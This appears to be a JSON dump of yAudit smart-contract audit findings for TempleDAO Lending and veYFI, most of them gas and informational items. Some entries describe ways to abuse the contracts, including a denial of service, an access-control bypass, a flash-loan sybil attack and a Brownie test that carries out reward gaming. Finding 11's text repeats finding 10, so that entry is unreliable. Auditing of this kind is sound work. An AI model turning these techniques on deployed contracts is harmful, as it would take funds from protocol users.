        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "In computeLiquidity(), the debt token cache struct is data independent in the for loop and can be moved outside to improve gas costs.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Debt token cache is re-initialized in borrow() function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The borrow() function first initializes the cache in line 204 and then calls the _checkLiquidity() internal function which also initializes the same cache.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Change visibility of public constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Several contracts define a VERSION constant that is marked as public, while at the same time expose the same constant value in an explicit getter function. Examples: TempleDebtToken.sol TreasuryReservesVault.sol DsrBaseStrategy.sol",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Cache storage variable locally to prevent multiple reads from storage",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "rewardsRecipient in AuraStaking::getReward() rewardTokens[i] in AuraStaking::getReward() poolHelper in Ramos::rebalanceUpExit() poolHelper in Ramos::rebalanceDownExit() poolHelper in Ramos::rebalanceUpJoin() poolHelper in Ramos::rebalanceDownJoin() tokenVault in Ramos::addLiquidity() tokenVault in Ramos::removeLiquidity() totalPrincipal in TempleDebtToken::currentTotalDebt() maxTreasuryPriceIndexDelta in TreasuryPriceIndexOracle::setTreasuryPriceIndex() rescuer in TempleElevatedAccess::proposeNewRescuer() cap in TempleCircuitBreakerAllUsersPerPeriod::preCheck() treasuryReservesVault in DsrBaseStrategy::trvWithdraw() treasuryReservesVault in GnosisStrategy::borrowMax() treasuryReservesVault in GnosisStrategy::repay() treasuryReservesVault in GnosisStrategy::repayAll() treasuryReservesVault in TempleTokenBaseStrategy::trvWithdraw() _accountData.collateral in TempleLineOfCredit::removeCollateral()",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Unneeded unsafe downcasting in debt token cache",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The DebtTokenCache struct is used in TempleLineOfCredit.sol as a cache to initialize several values from storage to be used in different functions of the contract. In this cache struct, the interestAccumulator field is defined as uint128 while its matching field in the struct used in storage is defined as uint256, leading to an unsafe downcast while initializing the struct in _initDebtTokenCache()",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Set proper types to remove SafeCast operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Multiple setter functions in TreasuryPriceIndexOracle.sol cast function arguments to smaller integer types (1, 2, 3). This casting is unnecessary if the function argument is the proper type.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The subtractions in _mintDToken() can be unchecked because they are inside if/else branches with logic that prevents an underflow from happening (L569, L577). The calculation of _remaining in _burnDToken() can be made unchecked because _burnedAmount is the same as the value of toBurnAmount or less, based on the logic found in dToken burn(). The calculation of _delta in setTreasuryPriceIndex() can be unchecked. The calculation of _newDebt in _repayTotalDebt() can be unchecked. In _burn(), the updates to the _burnAmount variable can be unchecked, as the repaid amount should be less than the amount to burn (L275, L284, L293, L297).",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. enoughCooldown modifier can be simplified",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "enoughCooldown performs two checks: lastRebalanceTimeSecs != 0 lastRebalanceTimeSecs + cooldownSecs > block.timestamp In the case that lastRebalanceTimeSecs is zero, the 2nd condition will return false assuming cooldownSecs is set to a value less than block.timestamp. This means the first condition can be removed from the if statement to save gas.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Upgrade outdated dependencies",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "package.json lists @gnosis.pm/safe-contracts version 1.3.0 as a dependency. This version is the latest version available in the npm package but v1.4.1 is the latest available from the main gnosis repository. While the dependency is not used extensively though and is only imported into ThresholdSafeGuard.sol, SafeForked.sol, and IThresholdSafeGuard.sol, dependencies should remain updated to include the latest bug fixes. The prb/math dependency might be an easier to change because the npm package is update. Only the version number needs upgrading from 3.3.1 to the latest 4.0.1.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Incorrect variable type in BalancerPoolHelper",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The two return value structs are defined in IBalancerVault.sol. Observe that assets is of type IERC20 in JoinPoolRequest but of type address in ExitPoolRequest. struct JoinPoolRequest { IERC20[] assets; uint256[] maxAmountsIn; bytes userData; bool fromInternalBalance; } struct ExitPoolRequest { address[] assets; uint256[] minAmountsOut; bytes userData; bool toInternalBalance; } In comparison, these structs should have the same types according to the Balancer docs. The on-chain Balancer implementations of JoinPoolRequest and ExitPoolRequest also shows consistency in variable types between the structs, although type IAsset is used instead of type address.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. High centralization risk throughout protocol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Every DeFi protocol must decide how immutable or centralized the protocol will be. TempleDAO's design falls on the very centralized end of the spectrum. This by design and does not add risks if governance actions are only performed by trusted parties. But because this assumption is not governed by immutable code, some users may not be convinced that this assumption holds at all time. If this assumption does not hold, governance can: Withdraw tokens directly from the protocol contracts including AuraStaking.recoverToken(), AuraStaking.withdrawAllAndUnwrap(), AuraStaking.withdrawAndUnwrap(), Ramos.recoverToken(), TempleLineOfCredit.recoverToken(), TreasuryReservesVault.recoverToken(), etc. The majority of public or external functions in TempleDAO v2, especially in RAMOS and the strategies, has access control modifiers that allow only a governance multisig to call these functions. Many functions control key state variables that influence fees, Off-chain bots controlled by governance play a key role in performing swaps to stabilize the TEMPLE token price and handle liquidations. It was not clear during this audit what the off-chain bot implementation looks like and what the security around its operation looks like. In summary, the centralized nature of TempleDAO adds some risk because of the power that governance has. This finding has a risk of Informational only because the assumption was made that the protocol has trustworthy governance. If this assumption does not hold, the risk severity would likely jump to Critical. Even if all governance operates as a trusted party, centralization brings with it the risk of private key theft that has impacted several DAOs in the last couple of years.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Add events to RamosStrategy.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The borrow and repay functions in RamosStrategy.sol do not emit events. This is unlike the other events such as DsrBaseStrategy.sol and TempleTokenBaseStrategy.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. TLC lending curve configuration choices may result in low utilization ratio",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The values set in the deployment script for LinearWithKinkInterestRateModel.sol result in a significantly different borrowing curve compared to Compound v2 and Aave DAI markets. Consider the goals and risk implications of the current choices to determine how closely TempleDAO aims to align with these other protocols to remain competitive and maintain a utilization ratio in line with the DAO's goals. If the lowest borrowing rate at zero utilization is 5%, this may be too high of a borrowing rate with current market conditions to remain competitive. Compound and Aave regularly modify the values that determine their borrowing curves based on feedback from Gauntlet that accounts for current market conditions. The suggestion to lower the interest rate at zero utilization is only valid with the current Maker DSR rate of 3.19%. If Maker increases the DSR rate, such as with the recent eDSR proposal that passed, then a different y-intercept value would make sense nearer to whatever base rate DAI in the TempleDAO base strategy is earning.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Potential denial of service in TempleLineOfCredit.sol contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The TempleLineOfCredit.sol contract contains a circuit breaker safety measure in the removeCollateral() and borrow() functions. The current implementation of the circuit breaker (TempleCircuitBreakerAllUsersPerPeriod.sol) enforces a global volume limit over a sliding window period of time. As these limits apply globally to all users, any account can artificially generate volume to hit the caps defined by the circuit breaker, causing a temporary denial of service in the contract. For example, a malicious user can repeatedly call the addCollateral() and removeCollateral() functions to exhaust the limits of the circuit breaker and make the preCheck() call revert for all other users.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Unused fields in AccountData struct",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The following fields from the AccountData struct are not used throughout the codebase: removeCollateralRequestAmount borrowRequestAmount removeCollateralRequestAt borrowRequestAt",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The value 65535 appears in an if statement in TempleCircuitBreakerAllUsersPerPeriod.sol, but the value represents the length of the buckets array. The length of the array should be used instead of this magic number to give more context and accuracy to the if statement.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. Complexity reduction possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Multiple lines of code can be combined to reduce overall complexity.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. Hypothetical overflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "There is no logic that prevents this summation from overflowing in _withdrawFromBaseStrategy(). However, it is very unlikely for token balances to reach such a high value, so this would be safe in most normal cases.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. _withdrawFromBaseStrategy() does not check if transfer may revert",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "A comment in _withdrawFromBaseStrategy() indicates that the amount that is intended to be withdrawn from the base strategy may not be the amount that the base strategy returns. Specifically, the DsrBaseStrategy may return fewer tokens than requested if it does not have the amount requested.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. totalAvailable() can be declared external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "totalAvailable() is a public function that does not need to be public.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "In AuraStaking.sol: \"_recipeint\" -> \"_recipient\" In TreasuryReservesVault.sol, recoverToken() was copied from TempleDebtToken.sol but the comment was not modified: \"Recover any token from the debt token\" -> \"Recover any token from the TRV\" In TreasuryReservesVault.sol: \"mroe\" -> \"more\" In TreasuryReservesVault.sol:: \"dToken's\" -> \"dTokens\" In AbstractStrategy.sol and the 5 other strategy contracts: \"stratgy\" -> \"strategy\" In AbstractStrategy.sol and the 5 other strategy contracts: \"onthe\" -> \"on the\" In TempleDebtToken.sol: \"stoarge\" -> \"storage\" The link in this comment is broken",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. Usage of onlyElevatedAccess modifier in public functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The implementation of the onlyElevatedAccess() modifier relies on msg.sig to authorize access to a particular function. This variable refers to the first 4 bytes of the calldata, which contains the intended function selector to be executed on the called contract. The TempleElevatedAccess.sol contract holds a mapping that defines which callers have access to which functions (represented by their function selectors). It may be possible to ignore the restrictions if this modifier is used in public functions. Consider the following example contract: contract SomeContract is TempleElevatedAccess { function foo() external onlyElevatedAccess { ... bar(); ... } function bar() public onlyElevatedAccess { ... } } If bar() is called externally then onlyElevatedAccess will correctly check the authorization using the function selector for bar(). But if bar() is called internally, like in the case of foo(), then the check will be done using the function selector of the original call to the contract (foo()), as msg.sig will still refer to the first four bytes of the calldata.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "49. TLC design may increase liquidation risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Unlike protocols like Compound Finance, there is no difference between the max LTV that a user can borrow and the liquidation threshold. When combined with the interest that accumulates on the loan each block, this means that a loan with 85% LTV can be liquidated in the next block. Another scenario that can cause user liquidation is reducing the Treasury Price Index (TPI). Because the value of TEMPLE collateral is price using the TPI, when the TPI drops, this causes an immediate drop in the value of collateral in TLC and cause positions to be eligible for liquidation. In normal market conditions, a reduction in TPI is unlikely, and a liquidation is unlikely to induce bad debt, but in the worst case scenario, governance's choice to reduce TPI can trigger liquidations that lead to bad debt for the protocol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Incompatible Vote Delegation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The VoteDelegation.sol contract has functions including delegate() and removeDelegation(), but the VoteDelegation.sol contract does not have any interaction with the snapshot DelegateRegistry contract. Because there are no contract calls to snapshot.org contracts, snapshot.org will not register any vote delegation.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Lock 1e-18 YFI to Get Rewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "def test_gauge_cheat_yfi_lock( yfi, ve_yfi, whale, whale_amount, shark, shark_amount, fish, fish_amount, create_vault, create_gauge, gov ): yfi.approve(ve_yfi, shark_amount, {\"from\": shark}) ve_yfi.create_lock( shark_amount, chain.time() + 4 * 3600 * 24 * 365, {\"from\": shark} ) assert yfi.balanceOf(shark) == 0 yfi.approve(ve_yfi, fish_amount, {\"from\": fish}) ve_yfi.create_lock( fish_amount, chain.time() + 4 * 3600 * 24 * 365, {\"from\": fish} ) assert yfi.balanceOf(fish) == 0 yfi.approve(ve_yfi, 1, {\"from\": whale}) ve_yfi.create_lock( 1, chain.time() + 4 * 3600 * 24 * 365, {\"from\": whale} ) assert yfi.balanceOf(whale) == whale_amount - 1 lp_amount = 10**18 vault = create_vault() tx = create_gauge(vault) gauge = Gauge.at(tx.events[\"GaugeCreated\"][\"gauge\"]) vault.mint(shark, lp_amount/100) vault.approve(gauge, lp_amount, {\"from\": shark}) gauge.deposit({\"from\": shark}) vault.mint(fish, lp_amount/100) vault.approve(gauge, lp_amount, {\"from\": fish}) gauge.deposit({\"from\": fish}) vault.mint(whale, 100*lp_amount) vault.approve(gauge, 100*lp_amount, {\"from\": whale}) gauge.deposit({\"from\": whale}) yfi_to_distribute = 10**16 yfi.mint(gov, yfi_to_distribute) yfi.approve(gauge, yfi_to_distribute, {\"from\": gov}) gauge.queueNewRewards(yfi_to_distribute, {\"from\": gov}) assert pytest.approx(gauge.rewardRate()) == yfi_to_distribute / (7 * 24 * 3600) chain.sleep(3600*24*7) chain.mine() assert gauge.earned(whale) < .39 * yfi_to_distribute gauge.getReward({\"from\": whale}) assert yfi.balanceOf(whale) < .39 * yfi_to_distribute + whale_amount gauge.withdraw({\"from\": whale}) assert vault.balanceOf(whale) == 100*lp_amount",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Flash Loan Sybil Attack to Boost Rewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "Boosted Balance equation: https://github.com/YAcademy-Residents/veYFI/blob/7846291efec36638eae32ac8798544050ca20877/contracts/Gauge.sol#L302 Deposit Update Reward call: https://github.com/YAcademy-Residents/veYFI/blob/7846291efec36638eae32ac8798544050ca20877/contracts/Gauge.sol#L351 Total Supply increase: https://github.com/YAcademy-Residents/veYFI/blob/7846291efec36638eae32ac8798544050ca20877/contracts/Gauge.sol#L362",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Incorrect variables in getRewardFor call",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The _account variable should be used in this line instead of msg.sender https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L512 IExtraReward(extraRewards[i]).getRewardFor(msg.sender); The _account variable should be used in this line instead of msg.sender https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L501 IVotingEscrow(veToken).deposit_for(msg.sender, reward);",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Unclear Integration of Vote Delegation Until Value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The VoteDelegation.sol contract has functions including delegate() and removeDelegation(), but the VoteDelegation.sol contract does not have any interaction with the snapshot DelegateRegistry contract. Because the actual act of voting is planned to happen off-chain with snapshot.org, snapshot.org needs to recognize what a valid vote or delegation is in the snapshot that it takes for each proposal. Currently there is no option in the snapshot.org delegation approach for an \"until\" value. Factoring in the \"until\" value could be implemented in a custom snapshot.org voting strategy, but because no such strategy is mentioned anywhere in the veYFI repository, it is expected that this has not been considered.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. force_withdraw() penalty may inadequately deter gamification and attacks on voting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The penalty_ratio equation https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L570",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Voting delegation is missing edge case checks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The VoteDelegation.sol contract permits an until variable value of zero if the tokens are not locked. Any until variable value that is less than block.timestamp should have no impact on voting or delegation. But if the until value starts at zero, it is possible for the value to be increased to a value less than block.timestamp to reference a time in the recent past, but still have no impact. It is possible that the voting logic, which is not within the scope of these solidity contracts, may not properly consider this edge case. This edge case can be solved by adding a check in all functions that modify the until state variable, including _delegate() and increaseDelegationDuration(), to validate require(until > block.timestamp). An exception could be made for an until value of zero, resulting in a require statement that looks like require(_until > block.timestamp || _until == 0). Another edge case is a situation where the until value is set to a time beyond the lock expiration of the veYFI tokens. There is no check for to confirm until < locked.end. This edge case could also happen if a user delegated votes, then withdrew their tokens to a new account where the tokens were locked and votes delegated again. It is unclear whether the off-chain voting mechanism will handle this edge case, which could allow multiple votes from a single token. Otherwise, consider adding the check require(_until < locked.end).",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Sawtooth Wave Effect from Computing veYFI Balance and Supply Using Different Time Scales",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "Equation to compute Total Supply: https://github.com/YAcademy-Residents/veYFI/blob/7846291efec36638eae32ac8798544050ca20877/contracts/VotingEscrow.vy#L756 (t_i is truncated to a value in weeks at L748 and L750.) Equation to compute Balance: https://github.com/YAcademy-Residents/veYFI/blob/7846291efec36638eae32ac8798544050ca20877/contracts/VotingEscrow.vy#L677 _t is set to block.timestamp for balance computation: https://github.com/YAcademy-Residents/veYFI/blob/7846291efec36638eae32ac8798544050ca20877/contracts/VotingEscrow.vy#L647",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Equal penalty reward distribution not incentive aligned",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "A discussion for this issue was started by someone from Ribbon Finance (who forked the veYFI code) before the review ended in veYFI Issue 135 and a fix is being developed in PR #136. The issue is centered around how penalty fees paid in VotingEscrow.vy and Gauge.sol are redistributed to users.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. No penalty during migration",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The _lockingRatio() function returns PRECISON_FACTOR, equivalent to locking for the MAX_TIME value, when the ve token is undergoing migration: https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L221 Instead, it would be better to revert in this case so that the ve token can be finished without any users taking advantage of this edge case.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Using \"unchecked\"",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The _lockingRatio() function returns PRECISON_FACTOR, equivalent to locking for the MAX_TIME value, when the ve token is undergoing migration: https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L221 Instead, it would be better to revert in this case so that the ve token can be finished without any users taking advantage of this edge case.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Using simple comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The _notifyRewardAmount() function in BaseGauge.sol contains https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L170-L177 if (block.timestamp >= periodFinish) { rewardRate = reward / duration; } else { uint256 remaining = periodFinish - block.timestamp; uint256 leftover = remaining * rewardRate; reward = reward + leftover; rewardRate = reward / duration; } By switching around the if/else clauses, we can replace the compound operator with a simple one if (block.timestamp < periodFinish) { uint256 remaining = periodFinish - block.timestamp; uint256 leftover = remaining * rewardRate; reward = reward + leftover; rewardRate = reward / duration; } else { rewardRate = reward / duration; }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Use prefix in loops",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "There are 4 instances of this in Gauge.sol and 1 instance in VoteDelegation.sol https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L161 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L357 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L386 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L511 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VoteDelegation.sol#L121",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Payable functions can save gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The following functions have the onlyOwner modifier and can be marked as payable setVe() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Registry.sol#L49 addVaultToRewards() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Registry.sol#L67 removeVaultFromRewards() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Registry.sol#L94 setVe() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VeYfiRewards.sol#L30 setVe() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L110 setDuration() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L73 sweep() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L111",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Use != 0 for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Declare functions external for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "There are two public functions that can be external https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L287 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L317",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Remove Aragon calls for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The following functions include comments indicating they are fulling or partially used for Aragon compatibility, and may not otherwise be necessary: version state variable and _version init parameter https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L155 controller() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L129-L131 transfersEnabled() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L129-L131 balanceOf() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L650 totalSupply() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L772 changeController() https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L831-L837",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Inconsistent zero case in VotingEscrow.vy",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The balanceOf() function uses this code: if upoint.bias < 0: upoint.bias = 0 return convert(upoint.bias, uint256) while the balanceOfAt() function uses this code: if upoint.bias >= 0: return convert(upoint.bias, uint256) else: return 0",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Remove duplicated code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The logic for the case block.timestamp >= periodFinish and (distributedSoFar * 12) / 10 < _amount is the same, so they can be placed into the same if statement. https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L146-L150 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L156-L162 The revised queueNewRewards() function can look like this function queueNewRewards(uint256 _amount) external override returns (bool) { require(_amount != 0, \"==0\"); SafeERC20.safeTransferFrom( IERC20(rewardToken), msg.sender, address(this), _amount ); emit RewardsQueued(msg.sender, _amount); _amount = _amount + queuedRewards; uint256 elapsedSinceBeginingOfPeriod = block.timestamp - (periodFinish - duration); uint256 distributedSoFar = elapsedSinceBeginingOfPeriod * rewardRate; // we only restart a new week if _amount is 120% of distributedSoFar. if (block.timestamp >= periodFinish || (distributedSoFar * 12) / 10 < _amount) { _notifyRewardAmount(_amount); queuedRewards = 0; } else { queuedRewards = _amount; } return true; }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. SLOAD gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "Existing code https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L80-L84 Modified code to use local variable instead of state variable in emit if (block.timestamp < periodFinish) { uint256 remaining = periodFinish - block.timestamp; uint256 newRate = remaining * rewardRate / newDuration; rewardRate = leftover; } duration = newDuration; emit DurationUpdated(newDuration, newRate); A similar type of improvement can be made in Registry.sol https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Registry.sol#L95-L96 The code can be modified to address gauge = gauges[_vault]; require(gauge != address(0x0), \"!exist\");",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. SafeERC20 functions not used",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "Gauge.sol line 500 => rewardToken.approve(address(veToken), reward); Gauge.sol line 527 => IERC20(rewardToken).approve(veYfiRewardPool, toTransfer); VeYfiRewards.sol line 140 => rewardToken.approve(address(veToken), reward);",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Unspecified Voting Requirements",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "There are built-in voting assumptions in the contract code, mostly borrowed from Convex: When a proposal is created, the checkpoint() function in VotingEscrow.vy should be called to properly set the epoch Voting power should be calculated using the on-chain functions such as get_last_user_slope(), balanceOf(), balanceOfAt(), supplyAt(), totalSupply(), and totalSupplyAt() in VotingEscrow.vy. Note that some of the math in these calculations could be moved to an off-chain voting strategy for gas savings Voting for a proposal with veYFI is allowed as soon as the veYFI is locked. Because there is potential for gamification in increasing veYFI stake shortly before key votes, protocols like Convex have implemented a minimum locking duration of several weeks before a token holder can vote, which is implemented in their VotingEligibility.sol contract. Some open and unanswered questions include: Who is allowed to create proposals on snapshot.org? How are the results of each snapshot vote converted to on-chain rewards? Is this automated? Will all vaults receive a gauge that can be voted for on snapshot.org, even those holding very little value? If so, this could lead to gamification of deprecated or 